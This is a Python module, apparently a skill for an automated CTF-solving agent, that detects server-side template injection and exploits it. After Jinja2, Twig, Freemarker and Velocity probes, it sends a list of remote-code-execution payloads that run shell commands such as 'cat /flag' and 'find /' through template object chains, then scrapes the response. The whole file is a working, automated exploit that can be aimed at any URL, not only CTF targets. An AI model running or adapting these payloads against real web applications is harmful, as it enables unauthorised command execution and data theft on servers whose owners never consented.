"""SSTI 检测与利用 Skill：自动探测模板注入并提取 flag。

适用场景：Web 题中参数被渲染进模板（Jinja2/Twig/Freemarker），需探测注入点并 RCE。
输入：target_url + param_name
输出：flag 或确认 SSTI 存在的证据
"""
import re
import urllib.parse

try:
    import httpx
except ImportError:
    httpx = None


MARKERS = {
    "jinja2": {
        "probe": "{{7*7}}",
        "expect": "49",
    },
    "twig": {
        "probe": "{{7*7}}",
        "expect": "49",
    },
    "freemarker": {
        "probe": "${7*7}",
        "expect": "49",
    },
    "velocity": {
        "probe": "#set($x=7*7)$x",
        "expect": "49",
    },
}

RCE_PAYLOADS = [
    # Jinja2 - popen 直接读
    "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
    "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
    "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
    "{{request.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    # Jinja2 - getitem 方式
    "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag')['read']()}}",
    # Twig
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag')}}",
    # Freemarker
    "${\"freemarker.template.utility.Execute\"?new()(\"cat /flag\")}",
    # 通用 fallback - 读取常见 flag 路径
    "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('find / -name flag* 2>/dev/null').read()}}",
]


def _send(url, param, payload, method="GET"):
    """发送请求并返回响应文本。"""
    if httpx is None:
        return ""
    try:
        if method.upper() == "GET":
            resp = httpx.get(url, params={param: payload}, timeout=10, follow_redirects=True)
        else:
            resp = httpx.post(url, data={param: payload}, timeout=10, follow_redirects=True)
        return resp.text
    except Exception:
        return ""


def run(target_url: str = "", param_name: str = "input", method: str = "GET", **kwargs) -> dict:
    """探测 SSTI 并尝试提取 flag。

    Returns:
        {"flag": str, "evidence": str, "template_engine": str}
    """
    results = {"flag": "", "evidence": "", "template_engine": ""}

    # 支持 kwargs 传 url/param
    target_url = target_url or kwargs.get("url", "")
    param_name = param_name or kwargs.get("param", "input")

    if not target_url:
        results["evidence"] = "缺少 target_url 参数"
        return results

    # 阶段 1：探测注入点
    for engine, cfg in MARKERS.items():
        text = _send(target_url, param_name, cfg["probe"], method)
        if cfg["expect"] in text:
            results["template_engine"] = engine
            results["evidence"] = f"探测成功: {cfg['probe']} -> {cfg['expect']}"

            # 阶段 2：RCE 提取 flag
            for payload in RCE_PAYLOADS:
                text = _send(target_url, param_name, payload, method)
                if not text:
                    continue
                # 提取 flag
                flag_match = re.search(r"(?:flag|DASCTF)\{[^}]+\}", text)
                if flag_match:
                    results["flag"] = flag_match.group(0)
                    results["evidence"] += f"\nRCE 成功: {payload[:80]}"
                    return results
                # 记录有意义的输出
                if len(text) > 0 and text != cfg["expect"]:
                    clean = text.strip()[:200]
                    if clean:
                        results["evidence"] += f"\nRCE 输出: {clean}"
            break

    if not results["template_engine"]:
        results["evidence"] = "未检测到 SSTI（所有探测 payload 无回显）"
    return results
